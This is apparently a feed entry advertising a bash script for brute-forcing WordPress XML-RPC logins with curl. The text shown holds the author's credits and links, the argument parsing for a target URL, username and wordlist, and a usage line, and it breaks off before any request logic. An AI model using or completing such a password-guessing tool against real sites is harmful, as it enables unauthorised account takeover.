item.title: Simple WordPress Xml-rpc Brute Force written in bash with cURL
item.description: Simple WordPress Xml-rpc Brute Force written in bash with curl #!/bin/sh ##################### # # # Scripted By : Claudio Viviani # http://www.homelab.it # http://adf.ly/1F1MNw (Full HomelabIT Archive Exploit) # http://ffhd.homelab.it (Free Fuzzy Hashes Database) # # info@homelab.it # homelabit@protonmail.ch # # https://www.facebook.com/homelabit # https://twitter.com/homelabit # https://plus.google.com/+HomelabIt1/ # https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww # ##################### url=$1 user=$2 wordlist=$3 if [ -z "$wordlist" ]; then echo "Usage: $0 http://TARGT username wordlist.txt" exit 1 elif [ !
